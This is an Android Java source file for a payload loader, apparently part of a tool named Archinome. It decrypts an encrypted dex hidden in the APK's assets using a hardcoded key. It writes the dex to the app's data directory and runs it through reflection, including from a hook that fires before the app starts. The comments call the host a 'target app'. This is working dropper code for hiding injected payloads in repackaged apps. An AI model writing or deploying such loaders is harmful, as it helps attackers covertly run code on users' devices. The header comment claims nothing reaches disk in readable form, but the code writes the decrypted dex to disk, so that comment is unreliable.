package aaaaaaaaaaaa;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.system.Os;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

import dalvik.system.DexClassLoader;

/**
 * Reads the encrypted payload dex from the APK assets, decrypts it in memory and
 * loads it with DexClassLoader + reflection. Nothing ever lands on disk in
 * readable form, and the payload is not one of the APK's classes*.dex entries.
 *
 * Two ways in, both rootless:
 *
 *   run(Context)                  -- provider / receiver / activity triggers,
 *                                    uses AssetManager and the app data dir.
 *   runFromInfo(info, parent)     -- AppComponentFactory.instantiateClassLoader
 *                                    (API >= 29), which fires before the
 *                                    Application exists; there is no Context yet,
 *                                    so the APK is opened as a zip through
 *                                    ApplicationInfo.sourceDir and the dex is
 *                                    written into ApplicationInfo.dataDir.
 *
 * Blob layout (produced by pkg/assetpayload): "ARCHN1" || 12-byte GCM nonce ||
 * ciphertext || 16-byte tag; key = SHA-256(passphrase).
 */
public final class AssetLoader {

    public static final String TAG = "ARCHINOME";
    public static final String ASSET_NAME = "archinome_payload.enc";
    private static final String ASSET_PATH = "assets/" + ASSET_NAME;
    /** Must stay in sync with pkg/assetpayload.DefaultPassphrase. */
    private static final String DEFAULT_PASSPHRASE = "archinome-assets-key";

    private static final byte[] MAGIC = {'A', 'R', 'C', 'H', 'N', '1'};
    private static final int NONCE_LEN = 12;
    private static final int TAG_LEN = 16;

    private static final String PAYLOAD_CLASS = "dyn.Payload";
    private static final String PAYLOAD_METHOD = "executePayload";
    private static final String WORK_DIR = "archinome";
    private static final String WORK_DEX = "archinome.dex";

    private static boolean sRan;

    private AssetLoader() {
    }

    public static void log(String msg) {
        Log.i(TAG, msg);
    }

    public static synchronized boolean hasRun() {
        return sRan;
    }

    // ------------------------------------------------------------------ entry points

    /** Context-based entry point (ContentProvider.onCreate, BroadcastReceiver.onReceive, ...). */
    public static synchronized void run(Context ctx) {
        if (ctx == null) {
            log("ASSET_LOADER_NO_CONTEXT");
            return;
        }
        ApplicationInfo ai = ctx.getApplicationInfo();
        String apk = ai == null ? null : ai.sourceDir;
        String dataDir = ai == null ? null : ai.dataDir;
        String pkg = ai == null ? null : ai.packageName;

        byte[] blob;
        try {
            blob = readFromAssets(ctx);
            log("ASSET_READ_FROM_ASSETS " + blob.length + " bytes");
        } catch (Throwable t) {
            log("ASSET_READ_FROM_ASSETS_FAIL " + t + " -- trying the APK zip");
            blob = readFromApk(apk);
        }
        install(blob, apk, dataDir, pkg, ctx, AssetLoader.class.getClassLoader());
    }

    /** Context-free entry point: AppComponentFactory.instantiateClassLoader (API >= 29). */
    public static synchronized void runFromInfo(ApplicationInfo ai, ClassLoader parent) {
        if (ai == null) {
            log("ASSET_LOADER_NO_APPINFO");
            return;
        }
        byte[] blob = readFromApk(ai.sourceDir);
        install(blob, ai.sourceDir, ai.dataDir, ai.packageName, null,
                parent != null ? parent : AssetLoader.class.getClassLoader());
    }

    /**
     * Diagnostics for API 28, where instantiateClassLoader does not exist and no
     * Context/ApplicationInfo is reachable from the factory yet. On that API the
     * provider or receiver trigger has to be used instead.
     */
    public static void warnNoContextPath(String where) {
        log("ASSET_LOADER_NO_CONTEXT_PATH " + where
                + " (API < 29: use the provider or receiver trigger) java.class.path="
                + System.getProperty("java.class.path"));
    }

    // ------------------------------------------------------------------ the work

    private static void install(byte[] blob, String apk, String dataDir, String pkg,
                                Context ctx, ClassLoader parent) {
        if (sRan) {
            log("ASSET_LOADER_SKIP_ALREADY_RAN");
            return;
        }
        sRan = true;
        try {
            log("ASSET_LOADER_ENTERED apk=" + apk + " dataDir=" + dataDir + " pkg=" + pkg);
            if (blob == null) {
                log("ASSET_MISSING " + ASSET_PATH + " -- nothing to load, leaving the app alone");
                return;
            }
            byte[] dex = decrypt(blob, DEFAULT_PASSPHRASE);
            log("ASSET_DECRYPTED " + dex.length + " bytes, magic=" + new String(dex, 0, 4, "UTF-8"));

            File dir = new File(dataDir, WORK_DIR);
            if (!dir.exists() && !dir.mkdirs()) {
                log("ASSET_MKDIR_FAILED " + dir.getAbsolutePath());
            }
            File dexFile = new File(dir, WORK_DEX);
            // A previous run may have left the file read-only; the directory is
            // writable, so unlinking it first is always allowed.
            if (dexFile.exists() && !dexFile.delete()) {
                log("ASSET_DEX_DELETE_FAILED " + dexFile.getAbsolutePath());
            }
            writeFile(dexFile, dex);
            try {
                // ART refuses a dex file that the process could still write to
                // ("Writable dex file ... is not allowed"). The check is
                // access(path, W_OK), i.e. the real uid, so for a file the app
                // owns even 0600 is rejected -- drop the owner write bit too.
                Os.chmod(dexFile.getAbsolutePath(), 0400);
            } catch (Throwable t) {
                log("ASSET_CHMOD_WARN " + t);
            }
            log("ASSET_DEX_DROPPED " + dexFile.getAbsolutePath() + " (" + dexFile.length() + " bytes)");

            DexClassLoader cl = new DexClassLoader(dexFile.getAbsolutePath(),
                    dir.getAbsolutePath(), null, parent);
            Class<?> c = Class.forName(PAYLOAD_CLASS, true, cl);
            Object instance = c.newInstance();
            Method m = c.getMethod(PAYLOAD_METHOD, Context.class, String.class, String.class);
            m.invoke(instance, ctx, dataDir, pkg);
            log("ASSET_PAYLOAD_INVOKED " + PAYLOAD_CLASS + "." + PAYLOAD_METHOD);
        } catch (Throwable t) {
            // Never take the target app down: report and carry on.
            log("ASSET_LOADER_FAILED " + t);
            t.printStackTrace();
        }
    }

    private static byte[] decrypt(byte[] blob, String passphrase) throws Exception {
        if (blob == null) {
            throw new IllegalArgumentException("no blob");
        }
        if (blob.length < MAGIC.length + NONCE_LEN + TAG_LEN) {
            throw new IllegalArgumentException("sealed blob too short: " + blob.length);
        }
        for (int i = 0; i < MAGIC.length; i++) {
            if (blob[i] != MAGIC[i]) {
                throw new IllegalArgumentException("bad magic at " + i);
            }
        }
        byte[] key = MessageDigest.getInstance("SHA-256").digest(passphrase.getBytes("UTF-8"));
        byte[] nonce = Arrays.copyOfRange(blob, MAGIC.length, MAGIC.length + NONCE_LEN);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
                new GCMParameterSpec(TAG_LEN * 8, nonce));
        return cipher.doFinal(blob, MAGIC.length + NONCE_LEN, blob.length - MAGIC.length - NONCE_LEN);
    }

    private static byte[] readFromAssets(Context ctx) throws Exception {
        InputStream in = ctx.getAssets().open(ASSET_NAME);
        try {
            return readAll(in);
        } finally {
            in.close();
        }
    }

    private static byte[] readFromApk(String apk) {
        if (apk == null || apk.isEmpty()) {
            log("ASSET_APK_PATH_UNKNOWN");
            return null;
        }
        try {
            ZipFile zip = new ZipFile(apk);
            try {
                ZipEntry entry = zip.getEntry(ASSET_PATH);
                if (entry == null) {
                    log("ASSET_NOT_IN_APK " + ASSET_PATH + " @ " + apk);
                    return null;
                }
                InputStream in = zip.getInputStream(entry);
                try {
                    byte[] b = readAll(in);
                    log("ASSET_READ_FROM_APK " + b.length + " bytes @" + apk);
                    return b;
                } finally {
                    in.close();
                }
            } finally {
                zip.close();
            }
        } catch (Throwable t) {
            log("ASSET_APK_READ_FAIL " + apk + " " + t);
            return null;
        }
    }

    private static byte[] readAll(InputStream in) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) {
            out.write(buf, 0, n);
        }
        return out.toByteArray();
    }

    private static void writeFile(File f, byte[] data) throws Exception {
        FileOutputStream out = new FileOutputStream(f);
        try {
            out.write(data);
        } finally {
            out.close();
        }
    }
}
